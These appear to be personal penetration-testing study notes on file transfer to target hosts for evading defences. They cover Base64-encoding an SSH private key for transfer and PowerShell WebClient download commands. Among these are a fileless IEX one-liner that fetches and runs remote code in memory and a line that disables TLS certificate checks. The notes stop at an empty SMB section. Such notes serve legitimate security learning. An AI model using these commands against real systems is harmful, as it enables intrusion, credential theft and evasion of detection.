```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
Sometimes to bypass defences and detection mechanisms, we need to use various methods (sometimes in-conjunction with one another) to transfer files to/from a target system.

## PowerShell Base64 Encode & Decode
- We can encode a payload as Base64, copy and paste it to the other system (eg. via a terminal), and decode it on the system
- Doesn't require any network communication to transfer the file (only shell connection)
- It is important to check the hash of the payload on both sides to ensure its transferred correctly (eg. MD5)
- *CMD is limited to 8191 characters, so this will not work for larger files*
### Example transferring an SSH key
1. Check hash of key : `md5sum id_rsa`
2. Encode key : `cat id_rsa | base64; echo`
3. Copy contents to target machine
4. Use PowerShell to decode : `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<b64_string>"))`
5. Confirm hash : `Get-FileHash C:\Users\Public\id_rsa -Algorithm md5`

## PowerShell Web Downloads
- Most companies allow *HTTP* and *HTTPS* traffic through the firewall.
- Web filtering could still prevent access to certain websites, or block certain file type downloads etc
- The [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) class can be used to download a file over *HTTP* (80), *HTTPS* (443), or *FTP* (21). The methods can be seen below:

| Method                                                                                                                   | Description                                                                                                                |
| ------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Returns the data from a resource without blocking the calling thread.                                                      |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Downloads data from a resource and returns a Byte array.                                                                   |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Downloads data from a resource and returns a Byte array without blocking the calling thread.                               |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Downloads data from a resource to a local file.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Downloads data from a resource to a local file without blocking the calling thread.                                        |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Downloads a String from a resource and returns a String.                                                                   |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Downloads a String from a resource without blocking the calling thread.                                                    |
```Powershell
# Download a file
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Location>')

# Fileless download (Doesn't write to disk, executes directly from memory using Invoke-Expression [IEX])
IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')
(New-Object Net.WebClient).DownloadString('<Target File URL>') | IEX

# PowerShell 3.0+ can use Invoke-WebRequest (Alias: iwr, curl, wget)
Invoke-WebRequest '<Target File URL>' -OutFile '<Output File Location>'
# -UseBasicParsing can be used if there are IE engine problems

# If there is issues related to SSL/TLS certs not being trusted
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
[More Examples](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

## SMB Downloads
